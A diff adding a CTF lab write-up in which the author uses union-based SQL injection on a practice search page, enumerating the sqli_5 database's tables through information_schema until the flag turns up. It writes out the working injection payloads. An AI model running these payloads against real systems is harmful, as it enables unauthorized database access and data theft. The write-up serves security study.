@@ -155,6 +155,65 @@ Find the **FLAG**
 
 # Assignment 6 - 3 / CTF SQL Injection 2
 
+Firstly, when I searched using any random string, a simple and generic result appeared:
+| ID           | Level   | Rank Point | Info |
+|--------------|---------|------------|------|
+| abcde | ******* | *******    |      |
+
+However, when I searched for normaltic, a special sentence appeared in the info column:
+
+| ID         | Level   | Rank Point | Info                    |
+|------------|---------|------------|-------------------------|
+| normaltic  | ******* | ********   | my name is normaltic   |
+
+This led me to suspect that the info value is only shown when the ID is specifically 'normaltic'. I assumed that the backend query might look something like this:
+```
+select ?? from ?? where id =’normaltic’
+```
+Thus, I attempted a union-based injection:
+normaltic' AND '1' = '2' UNION SELECT 1,2,3,4,5,6 #
+
+I assumed that if I inserted a value into the 6th column, it would appear in the info section.
+
+![image](https://github.com/user-attachments/assets/c07dd357-0910-42d0-bcf4-fa236c8cff40)
+
+Founded name of database
+Databse: sqli_5
+![image](https://github.com/user-attachments/assets/a2306616-c605-4813-9ac8-69661141d422)
+
+Founded name of Table
+Table: flag_honey
+![image](https://github.com/user-attachments/assets/e4cbe209-c72b-41e4-8298-25c515eebb20)
+
+Founded coulmns of flag_honey
+coulmn: flag
+![image](https://github.com/user-attachments/assets/18a637ab-8ac5-44e2-8075-69cbf270953a)
+
+Got Fooled...
+I tried extracting the flag from the flag_honey table, but it returned nothing.
+![image](https://github.com/user-attachments/assets/915a5c10-4288-40b5-abc9-e281ab370c78)
+
+Suspecting There Might Be Other Tables I started to suspect that there could be additional tables I hadn't discovered yet.
+So I used the following payloads to enumerate more tables using **LIMIT**
+
+```
+normaltic' AND '1'='2' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema = 'sqli_5' LIMIT 1, 1 #
+normaltic' AND '1'='2' UNION SELECT 1,2,3,4,5,table_name FROM information_schema.tables WHERE table_schema = 'sqli_5' LIMIT 2, 2 #
+```
+As a result, I found two more tables: game and secret.
+
+![image](https://github.com/user-attachments/assets/b0015620-3027-4b86-9d0d-991448e31fc5)
+
+![image](https://github.com/user-attachments/assets/562b0d3e-23b1-4d8f-b682-4559b9c48d42)
 
 
+While inspecting the secret table, I found that it also had a flag column.
+![image](https://github.com/user-attachments/assets/a29af690-9b7b-4a92-bdb9-ccea8cd89191)
 
+Fooled Again…
+I tried dumping the flag but again, no output was shown.
+![image](https://github.com/user-attachments/assets/ce3ddb38-2488-407e-a6e8-4b0df351c4e4)
+
+This time, I assumed the flag might be in another row, not the first one.
+![image](https://github.com/user-attachments/assets/7a3bc626-b757-4ddc-a18a-54bd0e488058)
+Finally, I got the flag!
